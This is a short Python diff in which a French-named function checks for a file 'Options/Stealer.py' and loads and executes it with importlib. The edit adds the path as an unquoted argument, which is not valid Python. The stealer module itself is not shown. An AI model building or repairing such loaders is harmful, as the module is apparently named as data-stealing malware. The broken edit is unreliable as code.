@@ -57,7 +57,7 @@ def executer_fichier():
     fichier = 'Options/Stealer.py' 
 
     if os.path.exists(fichier):
-                spec = importlib.util.spec_from_file_location("Stealer")
+                spec = importlib.util.spec_from_file_location("Stealer", Options/Stealer.py)
         Stealer = importlib.util.module_from_spec(spec)
         spec.loader.exec_module(Stealer)
     else:
